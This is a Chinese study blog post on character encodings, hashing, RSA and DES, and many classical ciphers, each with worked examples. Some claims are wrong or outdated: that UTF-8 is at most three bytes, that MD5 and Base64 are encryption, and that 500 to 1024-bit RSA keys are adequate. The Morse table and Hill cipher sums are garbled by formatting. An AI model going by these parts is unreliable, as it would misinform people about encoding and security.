+    <article id="post-13编码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/04/13编码/">编码和加密</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/04/13编码/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h1><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>统一码，为每种语言中的每个字符设定了统一并且唯一的二进制编码。它把所有语言都统一到一套编码里。其通常用两个字节表示一个字符。<br>UTF是Unicode Transfomation Format，是Unicode字符集转换格式。<br>UTF-16都是用两个字节表示，UTF-8可以用一个字节、两个字节和最多三个字节。 UTF-32<br>下面引用一段文字：</p>
+<blockquote>
+<p>Unicode 做的跟国人GBK做的类似。但是格局更大。 GBK是收录了绝大部分汉字，部分阿拉伯符号，部分俄文，部分希腊字母等等。<br>Unicode收录的是全世界所有的文字和符号。 Unicode和ASC2兼容，但是与GB2312,GBK都不兼容。<br>所以世界上所有的符号都能用两个字节来表示。<br>这时候，中国人开心了，英文国家的人就不开心了。本来他们用asc2好好的，每个字符用一个字节表示，现在得用两个字节表示，这将占用带宽和硬盘呢。<br>于是他们基于Unicode发明了 UTF-8编码。<br>UTF-8是这样做的：</p>
+<ol>
+<li>单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</li>
+<li>n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。这样就形成了如下的UTF-8标记位：<br>0xxxxxxx<br>110xxxxx 10xxxxxx<br>1110xxxx 10xxxxxx 10xxxxxx<br>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx<br>111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx<br>1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx<br>… …</li>
+</ol>
+<p>这样，UTF-8存储英文时只用占用一个字节了。省！<br>接下来说说 UTF-16，<br>UTF-16没啥好说的，就是所有字符用两个字节，16位来表示。（但是要分大端对其还是小端对其）<br>UTF-16就是把Unicode码搬过来，简单无脑，只是会多费点空间。</p>
+</blockquote>
+<p>源于<a href="https://blog.csdn.net/qq_34471305/article/details/83301883" target="_blank" rel="noopener">这里</a></p>
+<h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>url编码是一种浏览器用来打包表单输入的格式，其实url编码就是一个字符ascii码的十六进制。</p>
+<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>一种被<strong>广泛</strong>使用的m密码散列函数，可以被破解。因为md5普遍、稳定、快速，所以它仍然用于普通数据的加密保护领域。<br>MD5算法还可以作为一种电子签名的方法来使用，使用 MD5算法就可以为任何文件（不管其大小、格式、数量）产生一个独一无二的“数字指纹”，借助这个“数字指纹”，通过检查文件前后MD5值是否发生了改变，就可以知道源文件是否被改动。<br>MD5加密后通常为16位或32位，16 位实际上是从 32 位字符串中，取中间的第 9 位到第 24 位的部分。</p>
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>Base64是字面意思，它基于64个可打印字符来表示二进制数据。<br>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3*8 = 4*6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长$\frac{1}{3}$。<br><img src="/img/13-1.png" alt="13-1"><br>$2^6=64$,这样刚好可以表示6Bit。<br>属于转义密文，然后会增加长度，便于破解。</p>
+<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>Ron Rivest、Adi Shamir、Leonard Adleman提出。<br>对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<br>今天只有短的RSA钥匙才可能被强力方式解破。<br>它通常是先生成一对RSA 密钥，其中之一是保密密钥，由用户保存；另一个为公开密钥，可对外公开，甚至可在网络服务器中注册。为提高保密强度，RSA密钥至少为500位长，一般推荐使用1024位。<br><img src="/img/13-2.png" alt="13-2"><br>加密、解密密钥不同。是非对称加密。</p>
+<h2 id="des加密"><a href="#des加密" class="headerlink" title="des加密"></a>des加密</h2><p>des是对称加密，加密解密使用同样的密钥。对称与否说的是信息发送方和接收方对于密码上的地位。<br><img src="/img/13-3.png" alt="13-3"><br>类似于转义密文，就是移位和逻辑运算的多次迭代（16次），因此只要知道密钥就很好求解，否则由于多次迭代就难以破解。<br>破解方法是暴力猜解密钥，其安全性会随着计算机的发展而逐渐减弱。但仍有一定强度。<br>密文开头是”U2FsdGVkX1”,可以有密钥也可以无密钥。    </p>
+<h2 id="古典密码（以下部分大部分为引用，源于这里）"><a href="#古典密码（以下部分大部分为引用，源于这里）" class="headerlink" title="古典密码（以下部分大部分为引用，源于这里）"></a>古典密码（以下部分大部分为引用，源于<a href="https://blog.csdn.net/qq_34206560/article/details/83242664" target="_blank" rel="noopener">这里</a>）</h2><p><strong>重要的会标红</strong><br>【字母表顺序】-数字<br>　　加密的时候，经常要把A~Z这26个字母转换成数字，最常见的一种方法就是取字母表中的数字序号。A代表1，B代表2，C代表3… </p>
+<p>　　字母 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　数字 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 </p>
+<p>【进制转换密码】<br>　　例如二进制：1110 10101 1101 10 101 10010 1111 1110 101<br>　　转为十进制：14 21 13 2 5 18 15 14 5<br>　　对应字母表：number </p>
+<p>【Mod算法】<br>　　我们可以对字母序号进行数学运算，然后把所得的结果作为密文。当运算结果大于26或小于1的时候，<br>　　我们希望把这个数值转为1~26的范围，那么取这个数除以26的余数即可。<br>　　Mod就是求余数的运算符，有时也用“%”表示。例如 29 Mod 26 = 3，或写成 29 % 26 = 3，意思是29除以26的余数是3。 </p>
+<p>【倒序】<br>　　加密时为经常要对字符进行倒序处理。如果让你按abcdef…的顺序背出字母表的每个字母会很容易，<br>　　但是如果是zyxwvu…的顺序那就很难背出来了。一个很熟悉的单词，如果按相反的顺序拼写，可能就会感到很陌生。 </p>
+<p>　　例如“love”字母倒过来拼就是“evol”。 </p>
+<p>　　具体加密时倒序有很多种方案，需要灵活运用。例如： </p>
+<p>　　每个单词的倒序：siht si a tset - this is a test<br>　　整句的倒序：tset a si siht - this is a test<br>　　数字的倒序：02 50 91 02 - 20 05 19 20(test) </p>
+<p>【间隔】<br>　　单词之间的间隔一般使用空格。在加密时常常要去掉空格，但有时某些字母或数字来替代空格也不失为一种好的加密方案。<br>　　错误空格位置也会起到很强的误导作用。 </p>
+<p>　　例如：t hi sis at est - this is a test </p>
+<p><font color="red">【字母频率】</font><br>　　频率分析法可以有效的破解单字母替换密码。 </p>
+<p>　　关于词频问题的密码，我在这里提供英文字母的出现频率给大家，其中数字全部是出现的百分比：<br>　　a 8.2 b 1.5 c 2.8 d 4.3<br>　　e 12.7 f 2.2 g 2.0 h 6.1<br>　　i 7.0 j 0.2 k 0.8 l 4.0<br>　　m 2.4 n 6.7 o 7.5 p 1.9<br>　　q 0.1 r 6.0 s 6.3 t 9.1<br>　　u 2.8 v 1.0 w 2.4 x 0.2<br>　　y 2.0 z 0.1 </p>
+<p>　　词频法其实就是计算各个字母在文章中的出现频率，然后大概猜测出明码表，最后验证自己的推算是否正确。<br>　　这种方法由于要统计字母出现频率，需要花费时间较长。参考《跳舞的小人》和《金甲虫》。 </p>
+<p><font color="red">【凯撒密码(Caesar Shifts, Simple Shift)】 </font></p>
+<p>　　也称凯撒移位，是最简单的加密方法之一，相传是古罗马恺撒大帝用来保护重要军情的加密系统，它是一种替代密码。 </p>
+<p>　　加密公式：密文 = (明文 + 位移数) Mod 26<br>　　解密公式：明文 = (密文 - 位移数) Mod 26 </p>
+<p>　　以《数字城堡》中的一组密码为例： </p>
+<p>　　HL FKZC VD LDS </p>
+<p>　　只需把每个字母都按字母表中的顺序依次后移一个字母即可——A变成B，B就成了C，依此类推。因此明文为： </p>
+<p>　　IM GLAD WE MET </p>
+<p>　　英文字母的移位以移25位为一个循环，移26位等于没有移位。所以可以用穷举法列出所有可能的组合。 </p>
+<p>　　例如：phhw ph diwhu wkh wrjd sduwb </p>
+<p>　　利用电脑可以方便地列出所有组合，然后从中选出有意义的话： </p>
+<p>　　qiix qi ejxiv xli xske tevxc<br>　　rjjy rj fkyjw ymj ytlf ufwyd<br>　　skkz sk glzkx znk zumg vgxze<br>　　tlla tl hmaly aol avnh whyaf<br>　　ummb um inbmz bpm bwoi xizbg<br>　　vnnc vn jocna cqn cxpj yjach<br>　　wood wo kpdob dro dyqk zkbdi<br>　　xppe xp lqepc esp ezrl alcej<br>　　yqqf yq mrfqd ftq fasm bmdfk<br>　　zrrg zr nsgre gur gbtn cnegl<br>　　assh as othsf hvs hcuo dofhm<br>　　btti bt puitg iwt idvp epgin<br>　　cuuj cu qvjuh jxu jewq fqhjo<br>　　dvvk dv rwkvi kyv kfxr grikp<br>　　ewwl ew sxlwj lzw lgys hsjlq<br>　　fxxm fx tymxk max mhzt itkmr<br>　　gyyn gy uznyl nby niau julns<br>　　hzzo hz vaozm ocz ojbv kvmot<br>　　iaap ia wbpan pda pkcw lwnpu<br>　　jbbq jb xcqbo qeb qldx mxoqv<br>　　kccr kc ydrcp rfc rmey nyprw<br>　　ldds ld zesdq sgd snfz ozqsx<br>　　meet me after the toga party &lt;-<br>　　nffu nf bgufs uif uphb qbsuz<br>　　oggv og chvgt vjg vqic rctva </p>
+<p>　　可知明文为：meet me after the toga party </p>
+<hr>
+<p><font color="red">【凯撒移位(中文版)】</font> </p>
+<p>　　就是按照中文字在Unicode编码表中的顺序进行移位，可以用来加密中文的信息。 </p>
+<p>　　例：[中文凯撒移位]<br>　　转换成Unicode编码：中文凯撒移位<br>　　移1位后成为： 丮斈凰撓秼低<br>　　转换成中文：[丮斈凰挠秼低] </p>
+<p><font color="red">【栅栏密码(The Rail-Fence Cipher)】</font> </p>
+<p>　　也称栅栏易位(Columnar Transposition)，即把将要传递的信息中的字母交替排成上下两行，<br>　　再将下面一行字母排在上面一行的后边，从而形成一段密码。栅栏密码是一种置换密码。 </p>
+<p>　　例如密文：TEOGSDYUTAENNHLNETAMSHVAED </p>
+<p>　　解密过程：先将密文分为两行 </p>
+<p>　　T E O G S D Y U T A E N N<br>　　H L N E T A M S H V A E D </p>
+<p>　　再按上下上下的顺序组合成一句话 </p>
+<p>　　THE LONGEST DAY MUST HAVE AN END. </p>
+<p>　　…………………………………………………….<br>　　<strong>加密时不一定非用两栏</strong>s，还是举《数字城堡》中的一个例子，密文为： </p>
+<p>　　PFEE SESN RETM MFHA IRWE OOIG MEEN NRMA ENET SHAS DCNS IIAA IEER BRNK FBLE LODI </p>
+<p>　　去掉空格：PFEESESNRETMMFHAIRWEOOIGMEENNRMAENETSHASDCNSIIAAIEERBRNKFBLELODI </p>
+<p>　　共64个字符，以8个字符为一栏，排列成8*8的方阵(凯撒方阵)： </p>
+<p>　　P F E E S E S N<br>　　R E T M M F H A<br>　　I R W E O O I G<br>　　M E E N N R M A<br>　　E N E T S H A S<br>　　D C N S I I A A<br>　　I E E R B R N K<br>　　F B L E L O D I </p>
+<p>　　从上向下竖着读：PRIMEDIFFERENCEBETWEENELEMENTSRESMONSIBLEFORHIROSHIMAANDNAGASAKI </p>
+<p>　　插入空格：PRIME DIFFERENCE BETWEEN ELEMENTS RESMONSIBLE FOR HIROSHIMA AND NAGASAKI (广岛和长崎的原子弹轰炸的最主要区别) </p>
+<p>　　…………………………………………………….<br>　　<strong>栅栏密码也可以用于中文，不过比较容易破解。</strong></p>
+<p>　　明文： 这是中文的栅栏密码<br>　　密文(3*3方阵)：这文栏是的密中栅码 </p>
+<p>　　由于中文用规则的栅栏比较容易破解，所以产生了一些变体，例如道家心法密籍《天仙金丹心法》中的一段加密方法。密文如下： </p>
+<p>　　○ 茫 天 ： 摹 然 月 终 为 鼎 半 是 真 灭 器 轮 假 不 但 伸 净 著 定 分 泥 万 ○ 无 ○ 光 人 经 法 一 从 尘 色 返 我 权 自 法 中 妙 大 空 照 生 屈 来 好 路 形 神 海 ○ 便 还 未 归 </p>
+<p>　　○ 茫<br>　　天 ： 摹<br>　　然 月 终 为<br>　　鼎 半 是 真 灭<br>　　器 轮 假 不 但 伸<br>　　净 著 定 分 泥 万 ○<br>　　无 ○ 光 人 经 法 一 从<br>　　尘 色 返 我 权 自 法 中 妙<br>　　大 空 照 生 屈 来 好 路 形 神<br>　　海 ○ 便 还 未 归 </p>
+<p>　　明文(从上向下竖着读)：天然鼎器净无尘，大海茫茫月半轮。著色空摹终是假，定光返照便为真。不分人我生还灭，但泥经权屈未伸。万法自来归一法，好从中路妙形神。 </p>
+<p>　　…………………………………………………….<br>　　利用电脑进行加密或解密，建议使用“列举加密”或“列举解密”，电脑会自动尝试一些正好匹配的栏位进行列举。 </p>
+<p>　　lyiroonevuclesey </p>
+<p>　　4栏：<br>　　loveyousincerely </p>
+<p>　　8栏：<br>　　lionvceeyroeulsy </p>
+<p><font color="red">【Vigenère Cipher】 </font></p>
+<p>　　由于频率分析法可以有效的破解单表替换密码，法国密码学家维吉尼亚于1586年提出一种多表替换密码，<br>　　即维吉尼亚密码，也称维热纳尔密码。维吉尼亚密码引入了“密钥”的概念，即根据密钥来决定用哪一行的密表来进行替换，<br>　　以此来对抗字频统计。 </p>
+<p>　　加密算法：例如密钥的字母为[d]，明文对应的字母[b]。根据字母表的顺序[d]=4,[b]=2，那么密文就是[d]+[b]-1=4+2-1=5=[e]，<br>　　因此加密的结果为[e]。解密即做此逆运算。 </p>
+<p>　　加密公式：密文 = (明文 + 密钥) Mod 26 - 1<br>　　解密公式：明文 = [26 + (密文 - 密钥)] Mod 26 + 1 </p>
+<p>　　也可以用查表法来进行加密：例如密钥的字母为[d]，明文对应的字母[b]，在下图的表格第一行找到字母”d”(深蓝色)，<br>　　再在左边第一列找到字母”b”(绿色)，两个字母的交叉点(b行d列)就是字母”E”，所以对应的密文字母为[e]。 </p>
+<p>　　[—————–图—————–] </p>
+<p>　　 a b c d e f g h i j k l m n o p q r s t u v w x y z<br>　　a A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　b B C D E F G H I J K L M N O P Q R S T U V W X Y Z A<br>　　c C D E F G H I J K L M N O P Q R S T U V W X Y Z A B<br>　　d D E F G H I J K L M N O P Q R S T U V W X Y Z A B C<br>　　e E F G H I J K L M N O P Q R S T U V W X Y Z A B C D<br>　　f F G H I J K L M N O P Q R S T U V W X Y Z A B C D E<br>　　g G H I J K L M N O P Q R S T U V W X Y Z A B C D E F<br>　　h H I J K L M N O P Q R S T U V W X Y Z A B C D E F G<br>　　i I J K L M N O P Q R S T U V W X Y Z A B C D E F G H<br>　　j J K L M N O P Q R S T U V W X Y Z A B C D E F G H I<br>　　k K L M N O P Q R S T U V W X Y Z A B C D E F G H I J<br>　　l L M N O P Q R S T U V W X Y Z A B C D E F G H I J K<br>　　m M N O P Q R S T U V W X Y Z A B C D E F G H I J K L<br>　　n N O P Q R S T U V W X Y Z A B C D E F G H I J K L M<br>　　o O P Q R S T U V W X Y Z A B C D E F G H I J K L M N<br>　　p P Q R S T U V W X Y Z A B C D E F G H I J K L M N O<br>　　q Q R S T U V W X Y Z A B C D E F G H I J K L M N O P<br>　　r R S T U V W X Y Z A B C D E F G H I J K L M N O P Q<br>　　s S T U V W X Y Z A B C D E F G H I J K L M N O P Q R<br>　　t T U V W X Y Z A B C D E F G H I J K L M N O P Q R S<br>　　u U V W X Y Z A B C D E F G H I J K L M N O P Q R S T<br>　　v V W X Y Z A B C D E F G H I J K L M N O P Q R S T U<br>　　w W X Y Z A B C D E F G H I J K L M N O P Q R S T U V<br>　　x X Y Z A B C D E F G H I J K L M N O P Q R S T U V W<br>　　y Y Z A B C D E F G H I J K L M N O P Q R S T U V W X<br>　　z Z A B C D E F G H I J K L M N O P Q R S T U V W X Y </p>
+<p>　　假如对如下明文加密： </p>
+<p>　　to be or not to be that is the question </p>
+<p>　　当选定“have”作为密钥时，加密过程是：密钥第一个字母为[h]，明文第一个为[t]，因此可以找到在h行t列中的字母[a]，依此类推，<br>　　得出对应关系如下： </p>
+<p>　　密钥：ha ve ha veh av eh aveh av eha vehaveha<br>　　明文：to be or not to be that is the question<br>　　密文：ao wi vr isa tj fl tcea in xoe lylsomvn </p>
+<p><font color="red">【Polybius密码(Polybius Cipher)】 </font></p>
+<p>　　也称棋盘密码，是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，<br>　　相传是世界上最早的一种密码。 </p>
+<p>　　假设我们需要发送明文讯息 “Attack at once”， 用一套秘密混杂的字母表填满波利比奥斯方阵，像是这样： </p>
+<p>　　  A D F G X<br>　　A b t a l p<br>　　D d h o z k<br>　　F q f v s n<br>　　G g j c u x<br>　　X m r e w y </p>
+<p>　　i和j视为同一个字，使字母数量符合 5 × 5 格。之所以选择这五个字母，是因为它们译成摩斯密码时不容易混淆，<br>　　可以降低传输错误的机率。使用这个方格，找出明文字母在这个方格的位置，再以那个字母所在的栏名称和列名称代替这个字母。<br>　　可将该讯息转换成处理过的分解形式。 </p>
+<p>　　明文：A T T A C K A T O N C E<br>　　密文：AF AD AD AF GF DX AF AD DF FX GF XF </p>
+<p>　　A,D,F,G,X也可以用数字1,2,3,4,5来代替，这样密文就成了： </p>
+<p>　　13 12 12 13 43 25 13 12 23 35 43 53 </p>
+<hr>
+<p>【ADFGX/ADFGVX密码(ADFGX/ADFGVX Cipher)】 </p>
+<p>ADFGX<br>　　1918年，第一次世界大战将要结束时，法军截获了一份德军电报，电文中的所有单词都由A、D、F、G、X五个字母拼成，<br>　　因此被称为ADFGX密码。ADFGX密码是1918年3月由德军上校Fritz Nebel发明的，<strong>是结合了Polybius密码和置换密码的双重加密方案</strong>。<br>　　A、D、F、G、X即Polybius方阵中的前5个字母。 </p>
+<p>　　明文：A T T A C K A T O N C E<br>　　经过Polybius变换：AF AD AD AF GF DX AF AD DF FX GF XF </p>
+<p>　　下一步，利用一个移位密钥加密。假设密钥是“CARGO”，将之写在新格子的第一列。再将上一阶段的密码文一列一列写进新方格里。 </p>
+<p>　　C A R G O<br>　　<strong>_____</strong><br>　　A F A D A<br>　　D A F G F<br>　　D X A F A<br>　　D D F F X<br>　　G F X F X </p>
+<p>　　最后，密钥按照字母表顺序“ACGOR”排序，再按照此顺序依次抄下每个字母下面的整列讯息，形成新密文。如下： </p>
+<p>　　FAXDF ADDDG DGFFF AFAXX AFAFX </p>
+<p>　　在实际应用中，移位密钥通常有两打字符那么长，且分解密钥和移位密钥都是每天更换的。 </p>
+<p>ADFGVX<br>　　在1918年6月，再加入一个字V扩充。变成以6×6格共36个字符加密。这使得所有英文字母（不再将I和J视为同一个字）以及数字0到9都可混合使用。<br>　　这次增改是因为以原来的加密法发送含有大量数字的简短信息有问题。 </p>
+<p>【乘法密码(Multiplication Cipher)】 </p>
+<p>　　乘法密码也是一种简单的替代密码，与凯撒密码相似，凯撒密码用的是加法，而乘法密码用的自然是乘法。<br>　　这种方法形成的加密信息保密性比较低。 </p>
+<p>　　加密公式：密文 = (明文 * 乘数) Mod 26 </p>
+<p>　　对于乘数密码，只有当乘数与26互质时，加密之后才会有唯一的解，因此乘数只可能有如下11种的选择： </p>
+<p>　　乘数 = 3,5,7,9,11,15,17,19,21,23,25 </p>
+<p>　　仿射密码和希尔密码因为都用到了乘法，所以乘数也受到相同的局限。 </p>
+<hr>
+<p>【仿射密码(Affine Shift)】 </p>
+<p>　　仿射密码就是凯撒密码和乘法密码的结合。 </p>
+<p>　　加密公式：密文 = (明文 * 乘数 + 位移数) Mod 26 </p>
+<hr>
+<p><font color="red">【希尔密码(Hill Cipher)】 </font></p>
+<p>　　希尔密码就是矩阵乘法密码，运用基本矩阵论原理的替换密码。每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，<br>　　跟一个n×n的密钥矩阵相乘，再将得出的结果模26。希尔密码的优点是完全隐藏了字符的频率信息，弱点是容易被已知明文攻击击破。 </p>
+<p>加密<br>　　例如：密钥矩阵<br>　　1 3<br>　　0 2 </p>
+<p>　　明文：HI THERE </p>
+<p>　　去空格，2个字母一组，根据字母表顺序换成矩阵数值如下，末尾的E为填充字元： </p>
+<p>　　HI TH ER EE<br>　　8 20 5 5<br>　　9 8 18 5 </p>
+<p>　　HI 经过矩阵运算转换为 IS，具体算法参考下面的说明： </p>
+<p>　　|1 3| 8 e1<em>8+3</em>9=35 MOD26=9 =I<br>　　|0 2| 9 e0<em>8+2</em>9=18 MOD26=18=S </p>
+<p>　　用同样的方法把“HI THERE”转换为密文“IS RPGJTJ”，注意明文中的两个E分别变为密文中的G和T。 </p>
+<p>解密<br>　　解密时，必须先算出密钥的逆矩阵，然后再根据加密的过程做逆运算。 </p>
+<p>　　逆矩阵算法公式：<br>　　|A B| = 1/(AD-BC) * | D -B|<br>　　|C D| |-C A| </p>
+<p>　　例如密钥矩阵=<br>　　|1 7|<br>　　|0 3|<br>　　AD-BC=1<em>3-0</em>7=3 3*X=1 mod26 所以 X=9<br>　　因此<br>　　|1 7| 的逆矩阵为： 9 * |3 -7|<br>　　|0 3| |0 1| </p>
+<p>　　假设密文为“FOAOESWO” </p>
+<p>　　FO AO ES WO<br>　　 6 1 5 23<br>　　15 15 19 15 </p>
+<p>　　9* |3 -7| | 6| = 9<em>(3<em>6-7</em>15)=-783 mod26 = 23=W<br>　　 |0 1| |15| = 9</em>(0<em>6+1</em>15)= 135 mod26 = 5 =E </p>
+<p>　　所以密文“FOAOESWO”的明文为“WEREDONE” </p>
+<hr>
+<p>【Playfair密码(Playfair Cipher)】 </p>
+<p>　　Playfair将明文中的双字母组合作为一个单元对待，并将这些单元转换为双字母组合。<br>　　加密后的字符出现的频率在一定程度上被均匀化。 </p>
+<p>　　5*5变换矩阵(I或J视为同一字符)： </p>
+<p>　　C I P H E<br>　　R A B D F<br>　　G K L M N<br>　　O Q S T U<br>　　V W X Y Z </p>
+<p>　　加密规则：按成对字母加密 </p>
+<p>　　相同对中的字母加分隔符(如x)<br>　　ballon -&gt; ba lx lo on<br>　　同行取右边：he-&gt;ec<br>　　同列取下边：dm-&gt;mt<br>　　其他取交叉：kt-&gt;mq od-&gt;tr </p>
+<p>　　例如：ballon -&gt; ba lx lo on -&gt; db sp gs ug </p>
+<p><font color="red">【摩斯电码】 </font></p>
+<p>　　摩斯电码(摩尔斯电码)是一种发报用的信号代码，是一种替代密码，用点(Dot)和划(Dash)的组合来表示各个英文字母或标点。 </p>
+<p>　　国际标准摩斯电码表 </p>
+<p>　　1 <em>—- A *- N -</em> [.] <em>-</em>-<em>-<br>　　2 <strong>— B -*</strong> O — [,] –<strong>–<br>　　3 *</strong>– C -</em>-* P <em>–</em> [:] —<strong>*<br>　　4 **</strong>- D -<em>* Q –</em>- [‘] <em>—-</em><br>　　5 <strong><em>** E * R *-</em> [?] **–</strong><br>　　6 -<strong><em>* F **-</em> S *</strong> [-] -<strong><em>*-<br>　　7 –</em></strong> G –* T - [()] -<em>–</em>-<br>　　8 —<em>* H **** U **- [@] *–</em>-*<br>　　9 —-* I <em>* V <strong><em>- [—] -</em></strong>-<br>　　0 —– J <em>— W <em>– 分数线 -</em></em>-</em><br>　 K -<em>- X -<strong>-<br>　 L *-</strong> Y -</em>– 终了[\r] <strong><em>-</em>-<br>　 M – Z –</strong> 始信[\n] -<em>-</em>- </p>
+<p>　　例：Hello (斜线代表字母之间的间隔)<br>　　<strong><em>*/</em>/*-</strong>/<em>-*</em>/—/ </p>
+<p>【置换密码(Transposition Cipher)】 </p>
+<h2 id="也称易位密码。"><a href="#也称易位密码。" class="headerlink" title="　　也称易位密码。 "></a>　　也称易位密码。 </h2><p>【替代密码(Monoalphabetic Substitution)】 </p>
+<p>　　也称单表替换密码。 </p>
+<p>【字母表数字 】<br>　　用1-26这些数字分别表示A-Z的字母。 </p>
+<p>　　字母 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　数字 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 </p>
+<p>【字母表代码】<br>　　同字母表数字，只是把10以下的数字添0补位。 </p>
+<p>　　字母 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　数字 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 </p>
+<p>【反字母表】<br>　　就是丹·布朗在《达·芬奇密码》一书中提到的埃特巴什码(Atbash Cipher)。它的原理是取一个字母，<br>　　指出它位于字母表正数第几位，再把它替换为从字母表倒数同样的位数后得到的字母。如：E被替换为V，N被替换为M等。 </p>
+<p>　　明码表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　密码表 Z Y X W V U T S R Q P O N M L K J I H G F E D C B A </p>
+<p>　　明文：sophia<br>　　密文：hlksrz </p>
+<p>【随机乱序字母】<br>　　即单字母替换密码。重排密码表二十六个字母的顺序，密码表会增加到四千亿亿亿多种，<br>　　能有效的防止用筛选的方法检验所有的密码表。这种密码持续使用几个世纪，直到阿拉伯人发明了频率分析法。 </p>
+<p>　　明码表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br>　　密码表 Q W E R T Y U I O P A S D F G H J K L Z X C V B N M </p>
+<p>　　明文：forest<br>　　密文：gbmrst </p>
+<p>【棋盘密码】<br>　　即Polybius密码。 </p>
+<p><font color="red">【键盘密码】 </font><br>　　加密的原理同棋盘密码，只是利用了键盘作为方阵。 </p>
+<p>　　键盘的字母分布： </p>
+<p>　　~!@#$%^&amp;*()_+|<br>　　`1234567890-=\<br>　　 QWERTYUIOP{}<br>　　 qwertyuiop[]<br>　　 ASDFGHJKL:”<br>　　 asdfghjkl;’<br>　　 ZXCVBNM&lt;&gt;?<br>　　 zxcvbnm,./ </p>
+<p>　　密文：72 81 12 63 01 12 63<br>　　明文：jianpan </p>
+<p>　　低下头看看键盘就知道了，<strong>密文就是键盘上的26个字母的坐标，72即第7列第2行</strong>，第7列正好是数字键[7]的位置，往下2个就是字母[J]。<br>【键盘移位】<br>　　密文：kosm[sm<br>　　明文：jianpan </p>
+<p>　　就是键盘上的字母往右一个。例如[j]键的右面是[k]，[i]键的右面是[o]，依此类推。<br>【软键盘密码】<br>　　密文1：まはす にはつ へつ たっゃの せちなゃ ひつなゃ てなゃ ひつな ゅつ ぬす<br>　　密文2：ㄈㄘㄍ ㄋㄘㄛ ㄠㄛ ㄗㄟㄙㄕ ㄐㄧㄇㄙ ㄨㄛㄇㄙ ㄣㄇㄙ ㄨㄛㄇ ㄩㄛ ㄎㄍ<br>　　密文3：црв мрж уж езып гёлы сжлы илы сжл ьж нв<br>　　密文4：＃←☆ △←◇ 〓◇ ●◆＿→ ★◎■＿ ↑◇■＿ □■＿ ↑◇■ ￣◇ ▲☆<br>　　明文：zhe shi li yong ruan jian pan jia mi de(这是利用软键盘加密的) </p>
+<p>　　用智能ABC或微软拼音输入法，把小键盘打开，选择日本平假名字符，输入“zhe shi”就会出现“まはす にはつ”，<br>　　如果切换到俄文字符就会出现“црв мрж”……<br>【数字小键盘密码】<br>　　数字小键盘的字母分布：<br>　　7 8 9<br>　　4 5 6<br>　　1 2 3 </p>
+<p>　　密文：852 74123 741236987 74269 78974123456 7412369<br>　　明文：I L O V E U </p>
+<p>　　对照小键盘，依次打这些字母，看组成的形状就行了。<br>　　关于Alt+小键盘数字的加密方法，参看：百度/Google/网页字符。 </p>
+<p><font color="red">【手机键盘密码】</font><br>　　根据手机键盘上的数字和对应的字母进行加密。<br>　　密文：42 21 71 71 93<br>　　明文：HAPPY<br>　　“42”：4键对应的是GHI，GHI第2个就是H；“21”：2键对应的是ABC，ABC第1个就是A。<br>　　加密时往往只出现数字键，而不给出具体的字母位置，这时解密时就要列举所有可能的组合，从中选出有意义的单词来。<br>　　例如密文：42779，这时就要从 GHI ABC PQRS PQRS WXYZ 中提出有意义的字符：HAPPY<br>　　另一种方法是根据形状加密的，和数字小键盘密码相同，按照密码里的数字比划一下就划出来了。<br>　　比如密文173946，对应的明文是H，17是左边一竖，39是右边一竖，46是中间一横。 </p>
+<p>【百度/Google/网页字符】 </p>
+<p>　　下面解释一下在百度、Google搜索中文的关键词时，地址栏上出现的奇怪字符。 </p>
+<p>百度字符(GB2312)<br>　　例如在百度搜索“你好”两个字，会转到一个地址为 <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> 的网页。 </p>
+<p>　　密文(GB码16进制)：%C4%E3%BA%C3<br>　　密文(GB码十进制)：50403 47811<br>　　明文：你好 </p>
+<p>　　百度用的是GB2312的中文编码，是16进制的。GB2312是标准的简体中文编码。“你”字的GB码为C4E3，“好”字的GB码为BAC3。<br>　　“你好”转换成十进制为50403和47811。 </p>
+<p>Google字符(URI)<br>　　例如在Google搜索“你好”两个字，会转到一个地址为 <a href="http://www.google.cn" target="_blank" rel="noopener">http://www.google.cn</a> 的网页。 </p>
+<p>　　密文(URI)：%E4%BD%A0%E5%A5%BD<br>　　明文：你好 </p>
